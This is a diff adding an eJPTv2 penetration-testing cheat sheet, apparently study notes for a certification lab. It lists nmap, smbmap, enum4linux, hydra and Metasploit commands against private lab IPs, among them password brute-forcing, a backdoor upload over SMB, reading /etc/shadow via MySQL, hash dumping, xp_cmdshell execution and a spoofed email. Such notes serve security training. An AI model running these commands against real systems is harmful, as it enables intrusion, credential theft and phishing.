@@ -1,0 +1,265 @@
+eJPTv2 - Complete Cheat-sheet :
+
+-> Assessment Methodologies:
+
+--> Information Gathering:
+host hackersploit.org
+whatweb hackersploit.org 
+whois hackersploit.org 
+whois 172.64.32.93
+dnsrecon -d hackersploit.org
+wafw00f hackertube.net -a
+sublist3r -d hackersploit.com -o hs_sub_enum.txt
+dnsenum zonetransfer.me 
+
+theHarvester -d hackersploit.org
+theHarvester -d hackersploit.org -b google,linkedin,dnsdumpster,duckduckgo,crtsh
+theHarvester -d zonetransfer.me -b all
+
+robots file - https://hackersploit.org/robots.txt
+site map - https://hackersploit.org/sitemap_index.xml
+Web tech - Wappalyzer, built with extensions 
+
+Tools: HTTrack 
+
+Website:
+https://sitereport.netcraft.com/
+https://dnsdumpster.com
+https://haveibeenpwned.com/
+
+Dorking:
+site:ine.com
+site:ine.com employees
+site:ine.com inurl:forum
+site:*.ine.com
+site:*.ine.com intitle:forum
+site:*.ine.com filetype:pdf
+inurl:auth_user_file.txt
+inurl:passwd.txt
+inurl:wp-config.bak
+
+nmap 192.168.2.3
+nmap -Pn 192.168.2.3
+nmap -Pn -p- 192.168.2.3
+nmap -Pn -p- -F -sU 192.168.2.3
+nmap -p 80,44 192.168.2.3
+nmap -p- -sV 192.168.2.3
+nmap -sV -p- -O 192.168.2.3
+nmap -Pn -F 192.168.2.3 -oN outputfile.txt
+
+--> Foot printing & Scanning:
+
+arp-scan -I eth1 192.168.31.0/24
+ping 192.168.31.2
+fping -I eth1 -g 192.168.31.0/24 -a
+nmap -sn 192.168.31.0/24
+
+--> SMB Enum:
+
+nmap -p445 -sV -sC -O <TARGET_IP>
+nmap -p445 --script smb-protocols 10.2.24.25
+nmap -p445 --script smb-security-mode 10.2.24.25 
+nmap -p445 --script smb-enum-sessions 10.2.24.25
+nmap -p445 --script smb-enum-sessions --script-args smbusername=administrator,smbpassword=smbserver_771 10.2.24.25
+nmap -p445 --script smb-enum-shares 10.2.24.25
+nmap -p445 --script smb-enum-users 10.2.24.25
+nmap -p445 --script smb-enum-users --script-args smbusername=administrator,smbpassword=smbserver_771 10.2.24.25
+nmap -p445 --script smb-server-stats --script-args smbusername=administrator,smbpassword=smbserver_771 10.2.24.25
+nmap -p445 --script smb-enum-domains --script-args smbusername=administrator,smbpassword=smbserver_771 10.2.24.25
+nmap -p445 --script smb-enum-groups --script-args smbusername=administrator,smbpassword=smbserver_771 10.2.24.25
+nmap -p445 --script smb-enum-services --script-args smbusername=administrator,smbpassword=smbserver_771 10.2.24.25
+nmap -p445 --script smb-enum-shares,smb-ls --script-args smbusername=administrator,smbpassword=smbserver_771 10.2.24.25
+
+nmap -p445 --script smb-protocols 10.2.21.233
+smbmap -u guest -p "" -d . -H 10.2.21.233
+smbmap -u administrator -p smbserver_771 -d . -H 10.2.21.233
+smbmap -u administrator -p smbserver_771 -H 10.2.21.233 -x 'ipconfig’
+smbmap -u administrator -p 'smbserver_771' -H 10.2.21.233 -L
+smbmap -u administrator -p 'smbserver_771' -H 10.2.21.233 -r 'C$'
+smbmap -u admin -p password1 -H 192.174.58.3
+smbmap -u administrator -p 'smbserver_771' -H 10.2.21.233 --upload '/root/sample_backdoor' 'C$\sample_backdoor'
+smbmap -u administrator -p 'smbserver_771' -H 10.2.21.233 --download 'C$\flag.txt'
+
+nmap -sV -p 139,445 192.28.157.3
+nmap --script smb-os-discovery -p 445 192.28.157.3
+
+enum4linux -o 192.230.128.3
+enum4linux -U 192.230.128.3
+enum4linux -S 192.187.39.3
+enum4linux -G 192.187.39.3
+enum4linux -i 192.187.39.3
+enum4linux -r -u "admin" -p "password1" 192.174.58.3
+
+--> Metasploit:
+use auxiliary/scanner/smb/smb_version
+use auxiliary/scanner/smb/smb_enumusers
+use auxiliary/scanner/smb/smb_enumshares
+use auxiliary/scanner/smb/pipe_auditor
+
+--> nmblookup: nmblookup -A 192.28.157.3
+
+--> smbclient:
+smbclient -L 192.28.157.3 -N
+smbclient //192.187.39.3/public -N
+smbclient -L 192.28.157.3 -U jane
+smbclient //192.174.58.3/jane -U jane
+smbclient //192.174.58.3/admin -U admin
+smb> get flag
+
+--> Dictionary Attack:
+nmap -Pn -sV 192.174.58.3
+msfconsole
+use auxiliary/scanner/smb/smb_login
+set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
+set SMBUser jane
+set RHOSTS 192.174.58.3
+exploit
+
+--> FTP:
+nmap -p21 -sV -sC -O 192.217.238.3
+ftp 192.217.238.3
+hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.217.238.3 -t 4 ftp
+nmap --script ftp-brute --script-args userdb=/root/users -p21 192.217.238.3
+nmap --script ftp-anon -p21 192.119.169.3
+
+--> SSH:  
+nmap -p22 -sV -sC -O 192.8.3.3
+nc 192.8.3.3 22
+ssh root@192.8.3.3 22
+nmap --script ssh2-enum-algos 192.8.3.3
+nmap --script ssh-hostkey --script-args ssh_hostkey=full 192.8.3.3
+nmap -p22 --script ssh-auth-methods --script-args="ssh.user=student" 192.8.3.3
+ssh student@192.8.3.3
+
+--> Dictionary Attack:
+hydra -l student -P /usr/share/wordlists/rockyou.txt 192.230.83.3 ssh
+nmap -p22 --script=ssh-brute --script-args userdb=/root/users 192.230.83.3
+Msfconsole
+use auxiliary/scanner/ssh/ssh_login
+set RHOSTS 192.230.83.3
+set USERPASS_FILE /usr/share/wordlists/metasploit/root_userpass.txt
+set STOP_ON_SUCCESS true
+set VERBOSE true
+exploit
+
+--> HTTP:
+nmap -p80 -sV -O 10.4.16.17
+whatweb 10.4.16.17
+http 10.4.16.17
+dirb 10.4.16.17
+browsh --startup-url http://10.4.16.17/Default.aspx
+nmap --script=http-enum -sV -p80 10.4.21.207
+nmap -sV -p 80 10.4.21.207 -script banner
+nmap --script=http-methods --script-args http-methods.url-path=/webdav/ -p80 10.4.21.207` - http methods nmap script
+curl 192.199.232.3 | more
+use auxiliary/scanner/http/brute_dirs
+use auxiliary/scanner/http/http_version
+
+--> HTTP Login:
+msfconsole
+use auxiliary/scanner/http/http_login
+set RHOSTS 192.199.232.3
+set USER_FILE /tmp/users
+set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+set VERBOSE false
+set AUTH_URI /dir/
+exploit
+
+MYSQL:
+
+nmap -sV -p3306 192.49.51.3
+mysql -h 192.49.51.3 -u root
+mysql > show databases;
+mydql> select load_file('/etc/shadow');
+    
+Metasploit Enum:
+
+msfconsole
+use auxiliary/scanner/mysql/mysql_schemadump
+set RHOSTS 192.49.51.3
+set USERNAME root
+set PASSWORD ""
+exploit
+    
+use auxiliary/scanner/mysql/mysql_writable_dirs
+set DIR_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt
+set RHOSTS 192.49.51.3
+set VERBOSE false
+set PASSWORD ""
+exploit
+    
+use auxiliary/scanner/mysql/mysql_file_enum
+set RHOSTS 192.49.51.3
+set FILE_LIST /usr/share/metasploit-framework/data/wordlists/sensitive_files.txt
+set PASSWORD ""
+exploit
+    
+use auxiliary/scanner/mysql/mysql_hashdump
+set RHOSTS 192.49.51.3
+set USERNAME root
+set PASSWORD ""
+exploit
+    
+Nmap Scripts:
+nmap --script ms-sql-info -p1433 10.4.21.27
+nmap --script ms-sql-ntlm-info --script-args mssql.instance-port=1433 -p1433 10.4.21.27
+nmap --script ms-sql-brute --script-args userdb=/root/Desktop/wordlist/common_users.txt,passdb=/root/Desktop/wordlist/100-common-passwords.txt -p1433 10.4.21.27
+nmap --script ms-sql-empty-password -p1433 10.4.21.27
+nmap --script ms-sql-dump-hashes --script-args mssql.username=admin,mssql.password=anamaria -p1433 10.4.21.27
+nmap --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-xp-cmdshell.cmd="ipconfig" -p1433 10.4.21.27
+nmap --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-xp-cmdshell.cmd="type c:\flag.txt" -p1433 10.4.21.27
+    
+MYSQL Login:
+    
+Metasploit::
+nmap -sV -p3306 192.222.16.3
+msfconsole
+use auxiliary/scanner/mysql/mysql_login
+set RHOSTS 192.222.16.3
+set USERNAME root
+set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+set VERBOSE false
+set STOP_ON_SUCCESS true
+exploit
+    
+Hydra : hydra -l root -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.222.16.3 mysql
+    
+MSSQL Enum with Metasploit port- 1433:
+nmap --script ms-sql-info -p1433 10.4.23.176
+msfconsole
+use auxiliary/scanner/mssql/mssql_login
+set RHOSTS 10.4.23.176
+set USER_FILE /root/Desktop/wordlist/common_users.txt
+set PASS_FILE /root/Desktop/wordlist/100-common-passwords.txt
+set VERBOSE false
+exploit
+    
+use auxiliary/admin/mssql/mssql_enum
+set RHOSTS 10.4.23.176
+exploit
+    
+use auxiliary/admin/mssql/mssql_enum_sql_logins
+set RHOSTS 10.4.23.176
+exploit
+    
+use auxiliary/admin/mssql/mssql_exec
+set RHOSTS 10.4.23.176
+set CMD whoami
+exploit
+    
+use auxiliary/admin/mssql/mssql_enum_domain_accounts
+set RHOSTS 10.4.23.176
+exploit
+
+SMTP:  
+nmap -sV 192.63.243.3
+nc 192.63.243.3 25
+telnet 192.63.243.3 25
+smtp-user-enum -U /usr/share/commix/src/txt/usernames.txt -t 192.63.243.3
+use auxiliary/scanner/smtp/smtp_enum
+sendemail -f admin@attacker.xyz -t root@openmailbox.xyz -s 192.63.243.3 -u Fakemail -m "Hi root, a fake mail from admin" -o tls=no
+
+
+
+
+
